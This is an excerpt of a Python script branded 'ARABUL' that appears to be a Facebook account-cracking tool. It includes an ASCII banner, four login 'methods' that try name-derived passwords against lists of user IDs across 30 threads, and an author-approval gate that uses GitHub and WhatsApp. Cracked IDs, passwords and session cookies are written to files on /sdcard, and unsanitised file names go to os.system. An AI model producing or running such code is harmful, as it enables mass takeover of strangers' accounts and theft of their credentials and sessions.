...
from concurrent.futures import ThreadPoolExecutor as sarfrazARABUL
from string import * 
...
sys.stdout.write('\x1b]2; ARABUL\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
logo =                                          """            
\033[1;36m    _____     _       ____  _____  _____   
\033[1;36m   |_   _|   / \     |_   \|_   _||_   _|  
\033[1;33m     | |    / _ \      |   \ | |    | |    
\033[1;33m _   | |   / ___ \     | |\ \| |    | |    
\033[1;38m| |__' | _/ /   \ \_  _| |_\   |_  _| |_   
\033[1;35m`.____.'|____| |____||_____|\____||_____|                                                                                                                                                                                     
\033[1;37m----------------------------------------------
\033[1;37m    [-] AUTHOR    :\033[1;32m Arabul
\033[1;37m    [-] GITHUB    :\033[1;32m MR-Arabul-Islam
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back ARABUL Menu ")
        exit()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ARABUL] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ARABULb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ARABULb};{ckkk}"
                    print(f"\r{R} [ARABUL-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ARABUL_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ARABUL_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r{A} [ARABUL-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/ARABUL_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ARABUL] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [ARABUL-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ARABUL_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/ARABUL_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [ARABUL-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ARABUL] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ARABUL] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [ARABUL-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ARABUL_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            pw = []
            clear()
            print('Put limit between 1 to 4')
            ...
            print(47*"-")
            with sarfrazARABUL(max_workers=30) as ARABULworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                ARABULworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                ARABULworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                ARABULworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                ARABULworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/ARABUL.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/ARABUL.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    ARABUL = input('Put File Name :')
    print(" ")
    sarfraz = input('Saving Put File Name :')
    os.system('touch ' +sarfraz)
    os.system('sort -r '+ARABUL+' | uniq > '+sarfraz)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + ARABUL )
    print(47*'-')
    print("File Saved To :" + sarfraz )
    print(47*'-')
    input(f"{S} Press Enter To Back ARABUL Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/ARABUL.txt\n') 
        filepath = input("Put File Name: ")
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/MR-Arabul-Islam/old.txt/blob/main/New.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+48729759883?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
